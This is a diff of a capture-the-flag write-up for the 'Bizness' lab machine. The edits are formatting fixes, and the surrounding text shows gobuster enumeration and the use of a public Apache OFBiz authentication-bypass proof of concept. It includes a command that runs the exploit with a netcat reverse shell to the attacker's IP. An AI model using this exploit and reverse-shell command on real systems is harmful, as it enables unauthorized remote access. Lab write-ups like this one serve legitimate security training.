@@ -84,9 +84,8 @@ We can't do anything in the web, so we will fuzzing with `gobuster` to find hidd
 And, we find the following resources:
 
 ```
-[2K/index.html           (Status: 200) [Size: 27200]
-
-[2K/control              (Status: 200) [Size: 34633]
+/index.html           (Status: 200) [Size: 27200]
+/control              (Status: 200) [Size: 34633]
 ```
 
 Under `/control` we have `/control/login`, so we browse to `https://bizness.htb/control/login` and we find the following form:
@@ -112,9 +111,9 @@ Seems very convenient for us, so we download a PoC and we try our luck.
 
 ## Foothold
 
->I used [This PoC](https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit) from [@kjakaba](https://www.vicarius.io/vsociety/sign/in?back=/users/jakaba) (thanks for the work! ;)).
+> I used [This PoC](https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit) from [@kjakaba](https://www.vicarius.io/vsociety/sign/in?back=/users/jakaba) (thanks for the work! ;)).
 >
->To be able to execute the [@kjakaba](https://www.vicarius.io/vsociety/sign/in?back=/users/jakaba)'s exploit, we need the [ysoserial-all.jar](https://github.com/frohoff/ysoserial) package.
+> To be able to execute the [@kjakaba](https://www.vicarius.io/vsociety/sign/in?back=/users/jakaba)'s exploit, we need the [ysoserial-all.jar](https://github.com/frohoff/ysoserial) package.
 {: .prompt-info}
 
 We open a `netcat` listening on our side:
@@ -124,7 +123,7 @@ And now, we run the exploit:
 
 `python3 ofbiz_exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.79 12345'`
 
->Seems that the PoCs that I tried don't work every time, and we may have to run it a few times, so be patient :P
+> Seems that the PoCs that I tried don't work every time, and we may have to run it a few times, so be patient :P
 {: .prompt-info}
 
 And... We get shell!
